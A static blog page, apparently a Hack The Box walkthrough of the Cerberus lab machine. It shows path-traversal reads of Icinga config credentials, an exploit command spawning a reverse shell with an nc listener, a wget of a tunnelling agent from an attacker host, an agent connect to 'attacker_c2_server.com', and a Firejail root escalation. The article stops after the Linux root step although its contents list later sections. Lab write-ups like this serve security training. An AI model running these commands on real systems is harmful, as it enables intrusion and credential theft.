@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Cerberus - HackTheBox WalkthroughIntroductionThis writeup covers the complete penetration testing methodology for compromising the Cerberus machine on HackTheBox. This is an advanced-level Active Dire">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Cerberus">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Cerberus - HackTheBox WalkthroughIntroductionThis writeup covers the complete penetration testing methodology for compromising the Cerberus machine on HackTheBox. This is an advanced-level Active Dire">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/icinga-Cerberus.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/ifconfig.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/DC-PING.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/got-root.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/bloodhound.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Cerberus/adfs.png">
+<meta property="article:published_time" content="2025-10-28T10:20:23.000Z">
+<meta property="article:modified_time" content="2025-10-28T10:24:53.085Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Cerberus/icinga-Cerberus.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Cerberus</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/27/HTB-LustrousTwo/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&text=HTB-Cerberus"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&is_video=false&description=HTB-Cerberus"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Cerberus&body=Check out this article: https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&title=HTB-Cerberus"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&name=HTB-Cerberus&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/28/HTB-Cerberus/&t=HTB-Cerberus"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cerberus-HackTheBox-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Cerberus - HackTheBox Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Port-Scanning"><span class="toc-number">1.2.1.</span> <span class="toc-text">Port Scanning</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP-Service-Discovery"><span class="toc-number">1.2.2.</span> <span class="toc-text">UDP Service Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-Icinga-Web-2"><span class="toc-number">1.3.</span> <span class="toc-text">Exploiting Icinga Web 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-File-Inclusion-LFI"><span class="toc-number">1.3.1.</span> <span class="toc-text">Local File Inclusion (LFI)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Configuration-Files"><span class="toc-number">1.3.2.</span> <span class="toc-text">Extracting Configuration Files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Successful-Authentication"><span class="toc-number">1.3.3.</span> <span class="toc-text">Successful Authentication</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remote-Code-Execution"><span class="toc-number">1.4.</span> <span class="toc-text">Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS-Enumeration"><span class="toc-number">1.4.1.</span> <span class="toc-text">DNS Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-CVE-2021-32747"><span class="toc-number">1.4.2.</span> <span class="toc-text">Exploiting CVE-2021-32747</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Pivoting-with-Ligolo-ng"><span class="toc-number">1.5.</span> <span class="toc-text">Network Pivoting with Ligolo-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-the-HTTP-Server"><span class="toc-number">1.5.1.</span> <span class="toc-text">Setting Up the HTTP Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Downloading-the-Agent"><span class="toc-number">1.5.2.</span> <span class="toc-text">Downloading the Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ligolo-ng-Configuration"><span class="toc-number">1.5.3.</span> <span class="toc-text">Ligolo-ng Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Establishing-the-Tunnel"><span class="toc-number">1.5.4.</span> <span class="toc-text">Establishing the Tunnel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Internal-Network-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">Internal Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Scanning-the-Domain-Controller"><span class="toc-number">1.6.1.</span> <span class="toc-text">Scanning the Domain Controller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-on-Linux"><span class="toc-number">1.7.</span> <span class="toc-text">Privilege Escalation on Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-SSSD"><span class="toc-number">1.7.1.</span> <span class="toc-text">Understanding SSSD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Container-Escape-via-Firejail"><span class="toc-number">1.7.2.</span> <span class="toc-text">Container Escape via Firejail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Cached-Credentials"><span class="toc-number">1.7.3.</span> <span class="toc-text">Extracting Cached Credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Cracking"><span class="toc-number">1.7.4.</span> <span class="toc-text">Password Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Active Directory Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM-Authentication"><span class="toc-number">1.8.1.</span> <span class="toc-text">WinRM Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound-Enumeration"><span class="toc-number">1.8.2.</span> <span class="toc-text">BloodHound Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Extended-Network-Enumeration"><span class="toc-number">1.9.</span> <span class="toc-text">Extended Network Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploying-Ligolo-on-the-Domain-Controller"><span class="toc-number">1.9.1.</span> <span class="toc-text">Deploying Ligolo on the Domain Controller</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-ManageEngine-ADSelfService-Plus"><span class="toc-number">1.10.</span> <span class="toc-text">Exploiting ManageEngine ADSelfService Plus</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2022-47966"><span class="toc-number">1.10.1.</span> <span class="toc-text">CVE-2022-47966</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Configuration"><span class="toc-number">1.10.2.</span> <span class="toc-text">Metasploit Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Proxy-Configuration"><span class="toc-number">1.10.3.</span> <span class="toc-text">Proxy Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation-Tips"><span class="toc-number">1.10.4.</span> <span class="toc-text">Exploitation Tips</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Cerberus
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-28T10:20:23.000Z" class="dt-published" itemprop="datePublished">2025-10-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Cerberus-HackTheBox-Walkthrough"><a href="#Cerberus-HackTheBox-Walkthrough" class="headerlink" title="Cerberus - HackTheBox Walkthrough"></a>Cerberus - HackTheBox Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This writeup covers the complete penetration testing methodology for compromising the Cerberus machine on HackTheBox. This is an advanced-level Active Directory machine that demonstrates real-world enterprise vulnerabilities including Local File Inclusion (LFI), container escape techniques, Active Directory enumeration, and exploitation of ManageEngine ADSelfService Plus.</p>
+<p><strong>Tools Used:</strong> Nmap, udpx, Icinga Web 2, Ligolo-ng, Evil-WinRM, Hashcat, BloodHound, Metasploit, Chisel</p>
+<p><strong>Difficulty:</strong> Hard</p>
+<hr>
+<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h3><p>Starting with an Nmap scan, we identify an HTTP service running on port 8080:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">8080/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://icinga.cerberus.local:8080/icingaweb2</span><br></pre></td></tr></table></figure>
+
+<h3 id="UDP-Service-Discovery"><a href="#UDP-Service-Discovery" class="headerlink" title="UDP Service Discovery"></a>UDP Service Discovery</h3><p>Using udpx to discover UDP services reveals several interesting ports:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">udpx -t 10.129.232.100</span><br><span class="line">2025/10/27 19:24:14 [*] 10.129.232.100:53 (dns)</span><br><span class="line">2025/10/27 19:24:15 [*] 10.129.232.100:389 (ldap)</span><br><span class="line">2025/10/27 19:24:18 [*] 10.129.232.100:123 (ntp)</span><br><span class="line">2025/10/27 19:24:26 [*] 10.129.232.100:88 (kerberos)</span><br></pre></td></tr></table></figure>
+
+<p>The presence of DNS, LDAP, and Kerberos indicates we’re dealing with an Active Directory environment.</p>
+<hr>
+<h2 id="Exploiting-Icinga-Web-2"><a href="#Exploiting-Icinga-Web-2" class="headerlink" title="Exploiting Icinga Web 2"></a>Exploiting Icinga Web 2</h2><h3 id="Local-File-Inclusion-LFI"><a href="#Local-File-Inclusion-LFI" class="headerlink" title="Local File Inclusion (LFI)"></a>Local File Inclusion (LFI)</h3><p>Research reveals that Icinga Web 2 is vulnerable to path traversal attacks:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/</span><br></pre></td></tr></table></figure>
+
+<p>Using the LFI vulnerability, we can read the <code>/etc/hosts</code> file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 iceinga.cerberus.local iceinga</span><br><span class="line">127.0.1.1 localhost</span><br><span class="line">172.16.22.1 DC.cerberus.local DC cerberus.local</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>
+
+<p>This reveals the internal network structure with the Domain Controller at 172.16.22.1.</p>
+<h3 id="Extracting-Configuration-Files"><a href="#Extracting-Configuration-Files" class="headerlink" title="Extracting Configuration Files"></a>Extracting Configuration Files</h3><p>We can determine the authentication backend by reading the authentication configuration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/authentication.ini</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[icingaweb2]</span><br><span class="line">backend = &quot;db&quot;</span><br><span class="line">resource = &quot;icingaweb2&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Next, we extract database credentials from the resources configuration file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/icingaweb2/resources.ini</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[icingaweb2]</span><br><span class="line">type = &quot;db&quot;</span><br><span class="line">db = &quot;mysql&quot;</span><br><span class="line">host = &quot;localhost&quot;</span><br><span class="line">dbname = &quot;icingaweb2&quot;</span><br><span class="line">username = &quot;matthew&quot;</span><br><span class="line">password = &quot;IcingaWebPassword2023&quot;</span><br><span class="line">use_ssl = &quot;0&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Successful-Authentication"><a href="#Successful-Authentication" class="headerlink" title="Successful Authentication"></a>Successful Authentication</h3><p>The extracted credentials work for the Icinga web application:</p>
+<p><img src="/images/Cerberus/icinga-Cerberus.png" alt="Icinga Web Authentication"></p>
+<hr>
+<h2 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a>Remote Code Execution</h2><h3 id="DNS-Enumeration"><a href="#DNS-Enumeration" class="headerlink" title="DNS Enumeration"></a>DNS Enumeration</h3><p>After exploring Icinga without finding additional attack vectors, we pivot to the UDP services discovered earlier:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig @10.129.232.100 icinga.cerberus.local</span><br><span class="line">;; AUTHORITY SECTION:</span><br><span class="line">cerberus.local.		3600	IN	SOA	dc.cerberus.local. hostmaster.cerberus.local. 526 900 600 86400 3600</span><br></pre></td></tr></table></figure>
+
+<h3 id="Exploiting-CVE-2021-32747"><a href="#Exploiting-CVE-2021-32747" class="headerlink" title="Exploiting CVE-2021-32747"></a>Exploiting CVE-2021-32747</h3><p>Research reveals an authenticated RCE vulnerability in Icinga Web 2:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/51586</span><br></pre></td></tr></table></figure>
+
+<p>We execute the exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cve.py -u http://icinga.cerberus.local:8080 -U matthew -P IcingaWebPassword2023 -i 10.10.14.68 -p 9090</span><br></pre></td></tr></table></figure>
+
+<p>Set up a listener to catch the reverse shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9090</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Network-Pivoting-with-Ligolo-ng"><a href="#Network-Pivoting-with-Ligolo-ng" class="headerlink" title="Network Pivoting with Ligolo-ng"></a>Network Pivoting with Ligolo-ng</h2><p>To access the internal network and bypass firewall rules, we’ll deploy Ligolo-ng for network tunneling.</p>
+<h3 id="Setting-Up-the-HTTP-Server"><a href="#Setting-Up-the-HTTP-Server" class="headerlink" title="Setting Up the HTTP Server"></a>Setting Up the HTTP Server</h3><p>On the attacking machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9091</span><br></pre></td></tr></table></figure>
+
+<h3 id="Downloading-the-Agent"><a href="#Downloading-the-Agent" class="headerlink" title="Downloading the Agent"></a>Downloading the Agent</h3><p>On the compromised Icinga server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@icinga:/tmp$ wget http://10.10.14.68:9091/agent</span><br></pre></td></tr></table></figure>
+
+<h3 id="Ligolo-ng-Configuration"><a href="#Ligolo-ng-Configuration" class="headerlink" title="Ligolo-ng Configuration"></a>Ligolo-ng Configuration</h3><p>Create the TUN interface on the attacker machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user [your_username] mode tun ligolo</span><br></pre></td></tr></table></figure>
+
+<p>Bring the interface up:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set ligolo up</span><br></pre></td></tr></table></figure>
+
+<p>Start the Ligolo proxy:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./proxy -selfcert</span><br></pre></td></tr></table></figure>
+
+<p>Connect the agent from the compromised host:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect attacker_c2_server.com:11601 --ignore-cert</span><br></pre></td></tr></table></figure>
+
+<h3 id="Establishing-the-Tunnel"><a href="#Establishing-the-Tunnel" class="headerlink" title="Establishing the Tunnel"></a>Establishing the Tunnel</h3><p>In the Ligolo proxy interface:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session</span><br><span class="line">tunnel_start</span><br><span class="line">ifconfig</span><br><span class="line">autoroute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cerberus/ifconfig.png" alt="Network Interface Configuration"></p>
+<p>Test connectivity to the Domain Controller:</p>
+<p><img src="/images/Cerberus/DC-PING.png" alt="Domain Controller Connectivity"></p>
+<hr>
+<h2 id="Internal-Network-Enumeration"><a href="#Internal-Network-Enumeration" class="headerlink" title="Internal Network Enumeration"></a>Internal Network Enumeration</h2><h3 id="Scanning-the-Domain-Controller"><a href="#Scanning-the-Domain-Controller" class="headerlink" title="Scanning the Domain Controller"></a>Scanning the Domain Controller</h3><p>With network access established, we scan the Domain Controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -Pn -sC -sV -O -T4 -p- 172.16.22.1 -vvvv --max-retries 2 --min-rate 500</span><br></pre></td></tr></table></figure>
+
+<p>The scan reveals WinRM is accessible:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">5985/tcp open  http    syn-ack ttl 64 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Privilege-Escalation-on-Linux"><a href="#Privilege-Escalation-on-Linux" class="headerlink" title="Privilege Escalation on Linux"></a>Privilege Escalation on Linux</h2><h3 id="Understanding-SSSD"><a href="#Understanding-SSSD" class="headerlink" title="Understanding SSSD"></a>Understanding SSSD</h3><p><code>sssd</code> (System Security Services Daemon) is an open-source client for enterprise identity management that allows Linux machines to join Active Directory domains.</p>
+<p>According to HackTricks’ Linux Active Directory documentation:</p>
+<blockquote>
+<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>. The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>. By default, the key is only readable with root permissions.</p>
+</blockquote>
+<p>On the Icinga server, we find <code>secrets.ldb</code> but no <code>secrets.mkey</code>. Let’s explore the <code>sss</code> directory:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@icinga:/var/lib/sss$ find . -type f</span><br><span class="line">find . -type f</span><br><span class="line">find: &#x27;./deskprofile&#x27;: Permission denied</span><br><span class="line">find: &#x27;./secrets&#x27;: Permission denied</span><br><span class="line">find: &#x27;./db&#x27;: Permission denied</span><br><span class="line">find: &#x27;./pipes/private&#x27;: Permission denied</span><br><span class="line">./mc/initgroups</span><br><span class="line">./mc/group</span><br><span class="line">./mc/passwd</span><br><span class="line">./pubconf/krb5.include.d/domain_realm_cerberus_local</span><br><span class="line">./pubconf/krb5.include.d/localauth_plugin</span><br><span class="line">./pubconf/krb5.include.d/krb5_libdefaults</span><br><span class="line">./pubconf/kdcinfo.CERBERUS.LOCAL</span><br><span class="line">find: &#x27;./keytabs&#x27;: Permission denied</span><br></pre></td></tr></table></figure>
+
+<h3 id="Container-Escape-via-Firejail"><a href="#Container-Escape-via-Firejail" class="headerlink" title="Container Escape via Firejail"></a>Container Escape via Firejail</h3><p>It’s clear we’re operating within a container (IP 172.16.22.2 instead of the target IP). Running LinPEAS reveals the system uses <code>/usr/bin/firejail</code>, which is vulnerable to CVE-2022-31214.</p>
+<p>Exploit reference:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.openwall.com/lists/oss-security/2022/06/08/10/1</span><br></pre></td></tr></table></figure>
+
+<p>Upload and execute the Python exploit. If there’s no output, upgrade your shell first:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can now run &#x27;firejail --join=2174&#x27; in another terminal to obtain a shell where &#x27;sudo su -&#x27; should grant you a root shell.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cerberus/got-root.png" alt="Root Access Obtained"></p>
